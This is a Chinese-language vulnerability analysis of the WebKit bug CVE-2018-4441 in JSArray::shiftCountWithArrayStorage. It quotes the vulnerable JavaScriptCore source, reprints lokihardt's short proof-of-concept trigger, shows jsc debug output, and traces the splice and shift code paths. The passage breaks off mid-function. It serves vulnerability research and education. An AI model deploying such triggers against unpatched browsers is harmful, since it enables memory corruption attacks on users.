<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.csA636EC80{text-align:left;margin:2pt 0pt 2pt -12pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="Xf89101d14bdf198adbf9cf5cb835d40cce88e05"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2018-4441</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Webkit shiftCountWithArrayStorage</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">WebKit</span><span class="cs9C1B1871">是</span><span class="cs8926E06">Apple Safari</span><span class="cs9C1B1871">浏览器中的</span><span class="cs8926E06">Web</span><span class="cs9C1B1871">浏览器引擎，也是其他</span><span class="cs8926E06">macOS</span><span class="cs9C1B1871">、</span><span class="cs8926E06">iOS</span><span class="cs9C1B1871">和</span><span class="cs8926E06">Linux</span><span class="cs9C1B1871">系统中应用的浏览器引擎。</span><span class="cs8926E06">2018</span><span class="cs9C1B1871">年</span><span class="cs8926E06">12</span><span class="cs9C1B1871">月，该漏洞在公开披露后，被发现影响最新版本的苹果</span><span class="cs8926E06">Safari</span><span class="cs9C1B1871">浏览器。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<h4 class="cs868C439D">
			<a name="环境配置"><span class="cs6EDCDAE2">环境配置</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">这里我用了补丁的前一个版本</span><span class="cs8926E06"> commit </span><span class="cs9FB05234">21687be235d506b9712e83c1e6d8e0231cc9adfd</span><span class="cs8926E06"> , </span><span class="cs9C1B1871">在</span><span class="cs8926E06"> ubuntu 1804 </span><span class="cs9C1B1871">下编译，环境相关的文件都放在了</span><span class="cs8926E06"><a class="cs508254C" href="https://github.com/rtfingc/cve-repo/tree/master/0x05-lokihardt-webkit-cve-2018-4441-shiftCountWithArrayStorage"><span class="cs1C2E50E7">这里</span></a></span></p><h4 class="cs868C439D">
			<a name="漏洞描述"><span class="cs6EDCDAE2">漏洞描述</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">漏洞发生在</span><span class="cs9FB05234">JSArray::shiftCountWithArrayStorage</span><span class="cs8926E06"> </span><span class="cs9C1B1871">这个函数，根据</span><span class="cs8926E06">lokihardt </span><span class="cs9C1B1871">的描述，除非对象的</span><span class="cs8926E06">prototype </span><span class="cs9C1B1871">有</span><span class="cs8926E06">indexed accessors </span><span class="cs9C1B1871">或者</span><span class="cs8926E06"> proxy</span><span class="cs9C1B1871">对象</span><span class="cs8926E06">(</span><span class="cs9C1B1871">我也不清楚是什么</span><span class="cs8926E06">:( ), </span><span class="cs9C1B1871">否则调用到这个函数的时候</span><span class="cs9FB05234">holesMustForwardToPrototype</span><span class="cs8926E06"> </span><span class="cs9C1B1871">都会返回</span><span class="cs9FB05234">false</span><span class="cs8926E06">, </span><span class="cs9C1B1871">本来带</span><span class="cs8926E06">holes </span><span class="cs9C1B1871">的对象就可以进入下面的处理逻辑</span><span class="cs8926E06">(</span><span class="cs9C1B1871">总的来说就是代码写错了</span><span class="cs8926E06">)</span></p><p class="cs3A447A38"><span class="cs9FB05234">bool JSArray::shiftCountWithArrayStorage(VM&amp; vm, unsigned startIndex, unsigned count, ArrayStorage* storage)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;unsigned oldLength = storage-&gt;length();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;RELEASE_ASSERT(count &lt;= oldLength);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// If the array contains holes or is otherwise in an abnormal state,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// use the generic algorithm in ArrayPrototype.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ((storage-&gt;hasHoles() &amp;&amp; this-&gt;structure(vm)-&gt;holesMustForwardToPrototype(vm, this)) </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|| hasSparseMap() </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|| shouldUseSlowPut(indexingType())) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (!oldLength)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return true;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;unsigned length = oldLength - count;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;storage-&gt;m_numValuesInVector -= count;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;storage-&gt;setLength(length);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">//.....</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">bool Structure::holesMustForwardToPrototype(VM&amp; vm, JSObject* base) const</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ASSERT(base-&gt;structure(vm) == this);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (this-&gt;mayInterceptIndexedAccesses())</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return true;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;JSValue prototype = this-&gt;storedPrototype(base);//</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (!prototype.isObject())</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;JSObject* object = asObject(prototype);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while (true) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Structure&amp; structure = *object-&gt;structure(vm);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (hasIndexedProperties(object-&gt;indexingType()) || structure.mayInterceptIndexedAccesses())</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prototype = structure.storedPrototype(object);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!prototype.isObject())</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;object = asObject(prototype);</span></p><h4 class="cs868C439D">
			<a name="poc-分析"><span class="csBF12A472">poc </span><span class="cs6EDCDAE2">分析</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">function main() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;let arr = [1];</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;arr.length = 0x100000;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;arr.splice(0, 0x11);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;arr.length = 0xfffffff0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;arr.splice(0xfffffff0, 0, 1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">main();</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">lokihardt</span><span class="cs8926E06"> </span><span class="cs9C1B1871">给出了</span><span class="cs8926E06">poc</span></p><p class="cs3A447A38"><span class="cs9FB05234">./jsc</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&gt;&gt;&gt; a=[1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&gt;&gt;&gt; describe(a)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Object: 0x7fffaf6b4340 with butterfly 0x7fe0000e4008 (Structure 0x7fffaf6f2a00:[Array, {}, ArrayWithInt32, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 97</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&gt;&gt;&gt; a.length=0x100000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">1048576</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&gt;&gt;&gt; describe(a)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Object: 0x7fffaf6b4340 with butterfly 0x7fe0000f8448 (Structure 0x7fffaf6f2b50:[Array, {}, ArrayWithArrayStorage, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 100</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&gt;&gt;&gt; a.splice(0,0x11)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">1,,,,,,,,,,,,,,,,</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先创建了一个</span><span class="cs8926E06"> </span><span class="cs9FB05234">ArrayWithInt32</span><span class="cs8926E06"> </span><span class="cs9C1B1871">类型的</span><span class="cs8926E06">array, length </span><span class="cs9C1B1871">改成</span><span class="cs9FB05234">0x100000</span><span class="cs8926E06"> </span><span class="cs9C1B1871">之后会转换成</span><span class="cs9FB05234">ArrayWithArrayStorage</span><span class="cs8926E06">, </span><span class="cs9C1B1871">然后调用</span><span class="cs8926E06"> </span><span class="cs9FB05234">splice</span><span class="cs8926E06"> </span><span class="cs9C1B1871">函数，实现在</span><span class="cs9FB05234">Source/JavaScriptCore/runtime/ArrayPrototype.cpp:1005</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的</span><span class="cs9FB05234">arrayProtoFuncSplice</span><span class="cs8926E06"> </span><span class="cs9C1B1871">函数</span></p><p class="cs40DD2BC9"><span class="cs8926E06">splice </span><span class="cs9C1B1871">用来删除修改</span><span class="cs8926E06">array, </span><span class="cs9C1B1871">如</span><span class="cs8926E06"> </span><span class="cs9FB05234">a.splice(0, 0x11)</span><span class="cs8926E06">, </span><span class="cs9C1B1871">就表示从</span><span class="cs9FB05234">index=0</span><span class="cs8926E06"> </span><span class="cs9C1B1871">开始删除</span><span class="cs8926E06">0x11 </span><span class="cs9C1B1871">项，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">第三个参数表示要替换的内容，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">如</span><span class="cs9FB05234">a.splice(0,0x11,1,1)</span><span class="cs8926E06"> </span><span class="cs9C1B1871">表示删除</span><span class="cs8926E06"> 0x11 </span><span class="cs9C1B1871">个项，然后添加两个项，内容都是</span><span class="cs8926E06">1, </span><span class="cs9C1B1871">也可以这</span><span class="cs9FB05234">a.splice(0,1,1,2,3)</span><span class="cs8926E06"> </span><span class="cs9C1B1871">要添加的项比删除多的时候会重新分配内存。我们看一下函数具体是怎么样实现的，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">这里用</span><span class="cs8926E06">poc </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> </span><span class="cs9FB05234">a.length=0x100000; a.splice(0,0x11)</span><span class="cs8926E06"> </span><span class="cs9C1B1871">为例</span></p><p class="cs3A447A38"><span class="cs9FB05234">EncodedJSValue JSC_HOST_CALL arrayProtoFuncSplice(ExecState* exec)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// 15.4.4.12</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;VM&amp; vm = exec-&gt;vm();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;auto scope = DECLARE_THROW_SCOPE(vm);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;JSObject* thisObj = exec-&gt;thisValue().toThis(exec, StrictMode).toObject(exec);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;EXCEPTION_ASSERT(!!scope.exception() == !thisObj);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (UNLIKELY(!thisObj))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return encodedJSValue();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// length = 0x100000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;unsigned length = toLength(exec, thisObj);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;RETURN_IF_EXCEPTION(scope, encodedJSValue());</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (!exec-&gt;argumentCount()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">//..</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// splice </span><span class="cs7FFD2630">第一个参数，</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">这里是</span><span class="cs9FB05234"> 0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;unsigned actualStart = argumentClampedIndexFromStartOrEnd(exec, 0, length);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;RETURN_IF_EXCEPTION(scope, encodedJSValue());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// actualDeleteCount = 0x100000 - 0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;unsigned actualDeleteCount = length - actualStart;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// argumentCount == 2, </span><span class="cs7FFD2630">进入判断，</span><span class="cs9FB05234"> actualDeleteCount = 0x11</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (exec-&gt;argumentCount() &gt; 1) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;double deleteCount = exec-&gt;uncheckedArgument(1).toInteger(exec);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RETURN_IF_EXCEPTION(scope, encodedJSValue());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (deleteCount &lt; 0)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;actualDeleteCount = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else if (deleteCount &gt; length - actualStart)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;actualDeleteCount = length - actualStart;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;actualDeleteCount = static_cast&lt;unsigned&gt;(deleteCount);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">//...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// itemCount </span><span class="cs7FFD2630">表示要添加的</span><span class="cs9FB05234"> item </span><span class="cs7FFD2630">数量，</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">这里是</span><span class="cs9FB05234"> 0 &lt; 0x11 --&gt; </span><span class="cs7FFD2630">调用</span><span class="cs9FB05234"> shift</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;unsigned itemCount = std::max&lt;int&gt;(exec-&gt;argumentCount() - 2, 0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (itemCount &lt; actualDeleteCount) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shift&lt;JSArray::ShiftCountForSplice&gt;(exec, thisObj, actualStart, actualDeleteCount, itemCount, length);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RETURN_IF_EXCEPTION(scope, encodedJSValue());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else if (itemCount &gt; actualDeleteCount) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unshift&lt;JSArray::ShiftCountForSplice&gt;(exec, thisObj, actualStart, actualDeleteCount, itemCount, length);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RETURN_IF_EXCEPTION(scope, encodedJSValue());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">把每个添加的</span><span class="cs9FB05234">item </span><span class="cs7FFD2630">内容写入</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for (unsigned k = 0; k &lt; itemCount; ++k) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;thisObj-&gt;putByIndexInline(exec, k + actualStart, exec-&gt;uncheckedArgument(k + 2), true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RETURN_IF_EXCEPTION(scope, encodedJSValue());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> // </span><span class="cs7FFD2630">重新设置长度</span><span class="cs9FB05234"> &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;scope.release();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;setLength(exec, vm, thisObj, length - actualDeleteCount + itemCount);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return JSValue::encode(result);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">整理一下</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9FB05234">actualStart</span><span class="cs8926E06"> </span><span class="cs9C1B1871">第一个参数，表示要开始</span><span class="cs8926E06">delete </span><span class="cs9C1B1871">的地方</span></li><li class="cs24C36B3"><span class="cs9FB05234">actualDeleteCount</span><span class="cs8926E06"> </span><span class="cs9C1B1871">第二个参数，要</span><span class="cs8926E06">delete </span><span class="cs9C1B1871">的数量，没有设置时默认是</span><span class="cs9FB05234">length - actualStart</span></li><li class="cs24C36B3"><span class="cs9FB05234">itemCount</span></li></ul>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">第三个参数开始的数量</span></li></ul>
		<ul style="margin-top:0;margin-bottom:0;">
			<ul style="margin-top:0;margin-bottom:0;">
				<li class="csA636EC80"><span class="cs9FB05234">itemCount &lt; actualDeleteCount</span><span class="cs8926E06"> </span><span class="cs9C1B1871">会调用</span><span class="cs8926E06"> shift</span></li><li class="csA636EC80"><span class="cs9FB05234">itemCount &gt; actualDeleteCount</span><span class="cs8926E06"> </span><span class="cs9C1B1871">调用</span><span class="cs8926E06"> unshift</span></li></ul>
		</ul>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">我们跟一下</span><span class="cs9FB05234">shift</span></p><p class="cs3A447A38"><span class="cs9FB05234">template&lt;JSArray::ShiftCountMode shiftCountMode&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">void shift(ExecState* exec, JSObject* thisObj, unsigned header, unsigned currentCount, unsigned resultCount, unsigned length)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;VM&amp; vm = exec-&gt;vm();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;auto scope = DECLARE_THROW_SCOPE(vm);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;RELEASE_ASSERT(currentCount &gt; resultCount);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">要多</span><span class="cs9FB05234"> delete </span><span class="cs7FFD2630">的数量</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;unsigned count = currentCount - resultCount;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;RELEASE_ASSERT(header &lt;= length);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;RELEASE_ASSERT(currentCount &lt;= (length - header));</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (isJSArray(thisObj)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JSArray* array = asArray(thisObj);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (array-&gt;length() == length &amp;&amp; array-&gt;shiftCount&lt;shiftCountMode&gt;(exec, header, count))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for (unsigned k = header; k &lt; length - currentCount; ++k) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unsigned from = k + currentCount;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unsigned to = k + resultCount;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JSValue value = getProperty(exec, thisObj, from);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RETURN_IF_EXCEPTION(scope, void());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (value) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;thisObj-&gt;putByIndexInline(exec, to, value, true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RETURN_IF_EXCEPTION(scope, void());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bool success = thisObj-&gt;methodTable(vm)-&gt;deletePropertyByIndex(thisObj, exec, to);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 